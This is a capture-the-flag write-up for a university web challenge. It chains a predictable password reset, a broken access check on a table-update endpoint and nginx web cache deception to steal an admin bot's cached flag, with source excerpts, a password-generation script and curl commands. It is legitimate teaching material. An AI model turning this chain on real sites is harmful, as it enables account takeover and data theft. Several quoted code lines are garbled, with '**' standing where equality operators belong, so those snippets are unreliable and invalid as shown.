# Under Construction

## Challenge Info

| Field | Value |
| --- | --- |
| **Context** | CTF class at CTU in Prague, 2026 |
| **Challenges** | Under Construction |
| **Category** | Web - Predictable Password Reset, Broken Access Control, Web Cache Deception |
| **Objective** | Exploit the password reset and table update endpoints, then retrieve the admin’s flag through a cached response |
| **Tools Used** | Browser developer tools, Node.js, js-sha256, curl |



## 1. Initial Analysis

After initially looking through all the files, I assumed that the following 3 files would be the most important:

- `app/main.js` - node.js application containing all the logic
- `bot/bot.py` - chromium bot which regularly logs into the website as admin
- `nginx/nginx.conf` - reverse proxy with **caching enabled**

The application is supposed to simulate a website where users can create blogs. It allows users to log in, change their password and view blogs.

## 2. Code Analysis

### 2.1 Database Analysis

In the `main.js` file, the database is initialized using the following code:

```js
db.exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL, note TEXT)");
db.run("INSERT OR REPLACE INTO users (id, username, password, note) VALUES (?,?,?,?);", [1, ADMIN_USERNAME, process.env.ADMIN_PASSWORD, process.env.FLAG]);
db.run("INSERT OR REPLACE INTO users (id, username, password, note) VALUES (?,?,?,?);", [2, "posts", process.env.POSTS_PASSWORD, "user which will be able to post in the future"]);
db.run("INSERT OR REPLACE INTO users (id, username, password, note) VALUES (?,?,?,?);", [3, "users", process.env.USERS_PASSWORD, "regular user"]);
db.exec("CREATE TABLE IF NOT EXISTS posts (id INTEGER PRIMARY KEY, heading TEXT NOT NULL, text TEXT NOT NULL, image TEXT NOT NULL)");
db.run("INSERT OR REPLACE INTO posts (id, heading, text, image) VALUES (?,?,?,?);", [1, "Welcome", "Welcome to my new cool page, hopefully, You will enjoy Your stay.", "/welcome.png"]);
db.run("INSERT OR REPLACE INTO posts (id, heading, text, image) VALUES (?,?,?,?);", [2, "News", "This site is under development. We make design changes, rework and refactor the code. We are still missing quiet a lot of functionalities, however, we work hard on them, so stay tuned.", "/under-construction.png"]);
```

This part shows us that the database contains only 2 tables. The first contains all the users, with the admin hiding the **FLAG** we are looking for in the `note` column. The second table contains only images and descriptions which are shown to the user on `landing.html`.

At first glance, it would therefore seem that the goal is to log in as admin.

### 2.2 Session Configuration

The same `main.js` file contains the following codeblock:

```js
app.use(session({
    secret: process.env.SESSION_SECRET,
    cookie: {
        httpOnly: true,
        maxAge: 30 * 60 * 1000,
        sameSite: "Lax",
    },
    resave: false,
    saveUninitialized: false,
}));
```

`httpOnly` gives us an important piece of information. Unfortunately, we cannot obtain the session cookie using JavaScript and therefore `document.cookie`.

### 2.3 Date Header

Furthermore, `main.js` contains the following codeblock:

```js
app.use((req, res, next) => {
    res.header("Date", new Date().toISOString());
    return next();
});
```

This part of the code ensures that every response contains a `Date` header with the current time in ISO String format. This is somewhat unusual, so I assumed that I could use it to my advantage when looking for the FLAG.

### 2.4 Chromium Bot

```python
while True:
    print("Bot activated")
    driver = webdriver.Chrome(options = options)
    driver.set_page_load_timeout(5)
    driver.get(challange_base_url)
    sleep(5)
    driver.find_element(By. ID, "username").send_keys(arguments.username)
    driver.find_element(By. ID, "password").send_keys(arguments.password)
    driver.find_element(By. ID, "login").click()
    sleep(5)
    landing_url = f"{challange_base_url}/landing.html"
    with open("/var/log/chal-bot.log", "a") as log_file:
        log_file.write(f"[{datetime.now()}] Log in: {'successful' if driver.current_url ** landing_url else 'failed'}\tCurrent URL is: {driver.current_url}\n")
    sleep(arguments.interval)
```

The bot logs into the website as admin at regular intervals of 50s. It is then redirected to `landing.html`, which automatically calls the `/api/posts` endpoint and displays all the posts on the website.

```html
<script>
window.onload = () => {
    const xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = () => {
        if(xhttp.readyState **= XMLHttpRequest.DONE) {
            const posts = JSON.parse(xhttp.responseText).posts;
            for(var i = 0; i < posts.length; i ++){
                var post = posts[i];
                var post = createPost(i, post.heading, post.text, post.image);
                document.getElementById("posts").appendChild(post);
            }
        }
    };
    xhttp.open("GET", "/api/posts");
    xhttp.send();
};
</script>
```

### 2.5 Nginx Configuration

```nginx
server {
    listen 80;
    server_name localhost;
    location ~* .(html|png)$ {
        proxy_cache my_cache;
        proxy_cache_valid 200 60s;
        proxy_pass http://127.0.0.1:3000;
        proxy_cache_bypass $http_cache_control;
    }
    location / {
        proxy_pass http://127.0.0.1:3000;
    }
}
```

The most important fact here is that the proxy caches responses for everything ending in `.html` and `.png`. Responses with status code 200 are cached for 60s.

## 3. Vulnerability #1 - Password Reset

### 3.1 Finding the Vulnerability

The `main.js` file contains an endpoint for resetting passwords. Its implementation looks like this:

```js
app.post("/api/reset-password", async (req, res) => {
    const username = req.body.username;
    if (username ** undefined) {
        return res.status(403).json({ "message": "Invalid username." });
    }
    const retrieved_user = await getUserByUsername(username);
    if (retrieved_user.username ** ADMIN_USERNAME) {
        return res.status(403).json({ "message": `Cannot reset ${ADMIN_USERNAME}'s password.` });
    }
    else {
        const date = new Date();
        const timeInSeconds = date.getTime() / 1000;
        const seconds = Math.ceil(timeInSeconds);
        const newPassword = sha256.update(`${username}:${seconds}`).hex().substring(0, 20);
        updateUserPassword(username, newPassword);
        return res.json({ "message": "Password reset." });
    }
});
```

We can notice a few things here:

1. We **cannot** reset the admin password.
2. The password is completely **predictable** and is created using `SHA256(username:timestamp)`.

### 3.2 Exploiting the Vulnerability

As we know from section `2.3`, every request also gives us a timestamp, so we can generate the password ourselves. Therefore, we reset the password for the `users` user on `reset-password.html`.

![](screenshots/Pasted%20image%2020260727214833.png)

We copy the `Date` header, convert it to an ISO String and generate the password in the same way.

```js
const sha256 = require('js-sha256');
const date = new Date("2026-07-27T19:47:17.000Z");
const seconds = Math.ceil(date.getTime() / 1000);
const newPassword = sha256.update(`users:${seconds}`).hex().substring(0, 20);
```

Next, we repeat the same steps for the `posts` user, and now we are able to log in as both users.

![](screenshots/Pasted%20image%2020260727215721.png)

There is nothing interesting on the landing page. Nevertheless, the `Change user` function in the Profile section will be very important when looking for further vulnerabilities.

![](screenshots/Pasted%20image%2020260727220007.png)

## 4. Vulnerability #2 - Updating a Table Using `/api/update/:table`

### 4.1 Finding the Vulnerability

As I mentioned in the previous section, the `Change user` function will be important for us. The function calls the `/api/update/:table` API, whose implementation looks like this:

```js
app.post("/api/update/:table", authenticationMiddleware, async (req, res) => {
    try {
        const body = req.body;
        var username = body.username;
        var usernames = await getUsernames();
        var table_name = req.params.table;
        if(!usernames.some(u => u.username ** username) || 
           req.session.user.username !** username || 
           !["posts","users"].includes(table_name)){
            return res.status(401).json({ "message": "Unauthorized operation."});
        }
        var retrieved_user = await getUserByUsername(body.username);
        if(retrieved_user.password !** body.old_password){
            return res.status(401).json({ "message": "Unauthorized operation."});
        }
        delete body.username;
        delete body.old_password;
        if(! Object.keys(body).every(key => /^[A-Za-z]+$/.test(key))){
            return res.status(400).json({ "message": "Can't edit"});
        }
        const setString = Object.keys(body).map(k => `${k} = ?`).join(', ');
        db.run(`UPDATE ${table_name} SET ${setString} WHERE id = ?;`, 
               Object.values(body).concat([req.session.user.id]), (err) => {
            if (err) return res.status(400).json({ "message": "Update error."});
            return res.json({ "message": "User edited." });
        });
    } catch (err) {
        return res.status(500).json({ message: "Database error." });
    }
});
```

We can notice several interesting things:

1. The `table` parameter can only be `users` or `posts`, and we must be logged in as the given user.
2. The input is handled to prevent SQL injection.
3. The SQL query `UPDATE ${table_name}` updates the table whose name matches the **logged-in** user.

We can use the third fact to our advantage, as we are able to update tables depending on who is logged in.

### 4.2 Exploiting the Vulnerability

If we are logged in as the `users` user, everything works correctly and the table with the same name is updated along with the changed `note`. However, if we log in as the `posts` user, we are able to modify the `posts` table, which contains the 2 images we see on the landing page by default. Since the record is updated based on its `id` and the `posts` user has id 2, we are able to modify the second image. Unfortunately, this fact alone does not tell us much, so we need to look at what happens with these images.

Looking at `landing.html`, we can notice that every visit to this page makes a request to the database and then displays all the posts.

```js
var heading = document.createElement("h3");
heading.id = `heading-post-${id}`;
heading.innerText = heading_content;
post.appendChild(heading);
var text = document.createElement("p");
text.id = `text-post-${id}`;
text.innerText = text_content;
post.appendChild(text);
var image = document.createElement("img");
image.id = `image-post-${id}`;
image.src = image_url;
post.appendChild(image);
```

The heading and text are fine. What interests us is the image part, specifically **`image.src = image_url;`**. This part is very important because using `image.src` makes a `GET request` to the URL provided in this attribute every time. This is a major vulnerability which we will now use.

From section `2.4`, we know that the bot regularly visits the page, logs in as admin and loads all the posts. My first idea was therefore XSS and stealing the admin cookie. Unfortunately, this is not possible, as we learned in section `2.2` that JavaScript does not have access to `document.cookie`. We therefore need to choose another approach.

We create a request to the given endpoint with the special URL `/api/user/x.html`. The reason will be explained in the following section.

```bash
curl -X POST http://URL/api/update/posts \\
  -H "Content-Type: application/json" \\
  -b "connect.sid=COOKIE" \\
  -d '{
    "username": "posts",
    "old_password": "OLD_PASSWORD",
    "image": "/api/user/x.html"
  }'
```

This request executed: `UPDATE posts SET image = '/api/user/x.html' WHERE id = 2;`. As a result, the post with id 2 now contains an `image` with our own URL.

## 5. Vulnerability #3 - Nginx Cache Poisoning

### 5.1 Finding the Vulnerability

The following codeblock in `main.js` will be important for us.

```js
app.use("/api/user", authenticationMiddleware, async (req, res) => {
    var user = req.session.user;
    const retrieved_user = await getUserById(user.id);
    return res.json({ "username": retrieved_user.username, "note": retrieved_user.note});
});
```

The `.use()` method is used in Express.js to attach middleware. For **any** request starting with `/api/user`, `authenticationMiddleware` is called first, followed by the asynchronous function itself. The important part is that this happens for **any** request starting with this URL, including `/api/user/something` and, most importantly, our `/api/user/x.html`.

Moreover, we use the nginx configuration from section `2.5`, specifically its caching of all URLs ending in `.html` or `.png`. Our URL meets both conditions:

1. It starts with `/api/user`
2. It ends with `.html`

### 5.2 Exploitation Flow

1. We change the `image` of the post with id 2 to `/api/user/x.html`.
2. The bot logs in as admin and visits `landing.html`.
3. A GET request is made to `/api/user/x.html`.
4. The server returns the data to the bot, including the FLAG we are looking for.
5. NGINX caches the response.
6. We make a GET request to `/api/user/x.html`.
7. We obtain the FLAG.

### 5.3 Exploiting the Vulnerability

We make the request from section `4.2`. Then we fetch the cached response using:

```bash
curl http://URL/api/user/x.html
```

This gives us the **FLAG** we were looking for.

```json
{"username":"admin","note":"NI-CTF{...}"}
```
